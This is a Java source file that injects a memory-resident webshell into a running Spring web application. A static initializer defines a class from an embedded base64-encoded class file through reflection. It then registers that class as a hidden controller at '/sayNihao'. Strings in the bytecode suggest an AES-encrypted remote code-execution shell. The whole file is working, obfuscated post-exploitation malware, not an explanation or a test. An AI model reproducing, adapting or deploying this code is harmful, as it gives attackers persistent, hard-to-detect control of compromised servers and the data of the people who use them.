package core.memshell;

import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;
import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import java.lang.reflect.Method;

public class SpringControllerMemShell {
    private static Object MEMSHELL_OBJECT;
    private static final String controller_name = "memshell.SpringControllerShell";
    private static final String method_name = "a";

    public SpringControllerMemShell() {
        InjectMemClass();
        InjectMem();
    }

    private static synchronized void InjectMem() {
        try {
            WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 2. 通过反射获得自定义 controller 中test的 Method 对象
            Method method2 = MEMSHELL_OBJECT.getClass().getMethod(method_name);
            // 3. 定义访问 controller 的 URL 地址
            PatternsRequestCondition url = new PatternsRequestCondition("/sayNihao");
            // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）
            RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();
            // 5. 在内存中动态注册 controller
            RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);

            mappingHandlerMapping.registerMapping(info, MEMSHELL_OBJECT, method2);
        } catch (Exception e) {

        }
    }

    public static synchronized void InjectMemClass() {
        try {
            MEMSHELL_OBJECT = Thread.currentThread().getContextClassLoader().loadClass(controller_name).newInstance();
        } catch (Exception var5) {
            try {
                Method var1 = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
                var1.setAccessible(true);
                byte[] var2 = base64Decode("yv66vgAAADMBQAoAWgCdCACeCQBFAJ8IAKAJAEUAoQgAogkARQCjBwCkCgAIAJ0KAAgApQoACACmCgBFAKcJAEUAqAgAqQkARQCqCgBaAKsKAFoArAgArQoArgCvBwCwCgAvALEKABQAsgoArgCzCgCuALQHALUIALYKALcAuAoALwC5CgC3ALoHALsKALcAvAoAHgC9CgAeAL4KAC8AvwgAwAoALADBCADCBwDDCgAsAMQHAMUKAMYAxwoALgDICADJBwDKBwBuBwDLBwDMCADNCgAsAM4IAM8IANAIANEIANIIANMKANQA1QcA1goAOADXCgA4ANgIANkLANoA2wgA3AoALwDdCwDaAN4LANoA3woARQDgCgBFAOEIAOILAOMA5AcA5QoALADmCgBFAKsKAEUA5wsA4wDoCADpCwDaAOgHAOoKAEwAnQoALgDrCwDsAO0KAC8A7goA7wDwCgAuAKYKAEwA8QoARQDyCgAvAPMKAO8A9AoA7wD1CAD2CAD3BwD4AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExtZW1zaGVsbC9TcHJpbmdDb250cm9sbGVyU2hlbGw7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwDlBwD5BwC1AQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcAzAEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEAAWEBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEAB3Nlc3Npb24BACBMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXNzaW9uOwEABGRhdGEBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7BwD6BwD7BwD8AQAKU291cmNlRmlsZQEAGlNwcmluZ0NvbnRyb2xsZXJTaGVsbC5qYXZhDABhAGIBABAzYzZlMGI4YTljMTUyMjRhDABbAFwBAARwQVMzDABdAFwBABAvZmF2aWNvbmRlbW8uaWNvDABeAFwBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwA/QD+DAD/AQAMAF8AfAwAXwBcAQAFVVRGLTgMAGAAXAwAYQBoDAEBAQIBAANBRVMHAPkMAQMBBAEAH2phdmF4L2NyeXB0by9zcGVjL1NlY3JldEtleVNwZWMMAQUBBgwAYQEHDAEIAQkMAQoBCwEAE2phdmEvbGFuZy9FeGNlcHRpb24BAANNRDUHAQwMAQMBDQwBDgEPDAEQAREBABRqYXZhL21hdGgvQmlnSW50ZWdlcgwBEgEGDABhARMMAP8BFAwBFQEAAQAQamF2YS51dGlsLkJhc2U2NAwBFgEXAQAKZ2V0RW5jb2RlcgEAEltMamF2YS9sYW5nL0NsYXNzOwwBGAEZAQATW0xqYXZhL2xhbmcvT2JqZWN0OwcBGgwBGwEcDAEdAR4BAA5lbmNvZGVUb1N0cmluZwEAD2phdmEvbGFuZy9DbGFzcwEAEGphdmEvbGFuZy9PYmplY3QBABBqYXZhL2xhbmcvU3RyaW5nAQAWc3VuLm1pc2MuQkFTRTY0RW5jb2RlcgwBHwEgAQAGZW5jb2RlAQAKZ2V0RGVjb2RlcgEABmRlY29kZQEAFnN1bi5taXNjLkJBU0U2NERlY29kZXIBAAxkZWNvZGVCdWZmZXIHASEMASIBIwEAQG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2NvbnRleHQvcmVxdWVzdC9TZXJ2bGV0UmVxdWVzdEF0dHJpYnV0ZXMMASQBJQwBJgEnAQAQWC1SZXF1ZXN0ZWQtV2l0aAcA+gwBKAB8AQAOWE1MSFRUUFJlcXVlc3QMASkBKgwBKwEsDAEtAHwMAIoAiwwAbwBwAQAQbWVtc2hlbGwucGF5bG9hZAcA/AwBLgEvAQAebWVtc2hlbGwvU3ByaW5nQ29udHJvbGxlclNoZWxsDAEwATEMAGsAbAwBMgEzAQAKcGFyYW1ldGVycwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAE0ATUHAPsMATYBNwwBOAE5BwE6DAE7ATwMAT0BBgwAgACBDAE4ARQMAT4AYgwBPwBiAQAOWG1sSFRUUFJlcXVlc3QBAAdTdWNjZXNzAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyAQATamF2YXgvY3J5cHRvL0NpcGhlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAHmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2Vzc2lvbgEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAtkZWZpbmVDbGFzcwEAFyhbQklJKUxqYXZhL2xhbmcvQ2xhc3M7AQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEACGdldEJ5dGVzAQAEKClbQgEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAHZG9GaW5hbAEABihbQilbQgEAG2phdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdAEAMShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAZsZW5ndGgBAAMoKUkBAAZ1cGRhdGUBAAcoW0JJSSlWAQAGZGlnZXN0AQAGKElbQilWAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAC2dldFJlc3BvbnNlAQAqKClMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAJZ2V0SGVhZGVyAQAHaW5kZXhPZgEAFShMamF2YS9sYW5nL1N0cmluZzspSQEACmdldFNlc3Npb24BACIoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAMZ2V0UGFyYW1ldGVyAQAMZ2V0QXR0cmlidXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL09iamVjdDsBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAxzZXRBdHRyaWJ1dGUB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");
                Class var3 = (Class) var1.invoke(Thread.currentThread().getContextClassLoader(), var2, 0, var2.length);
                MEMSHELL_OBJECT = var3.newInstance();
            } catch (Exception var4) {
            }
        }
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;

        Class base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) ((byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs));
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) ((byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs));
            } catch (Exception var5) {
            }
        }

        return value;
    }

    static{
        new SpringControllerMemShell();
    }
}
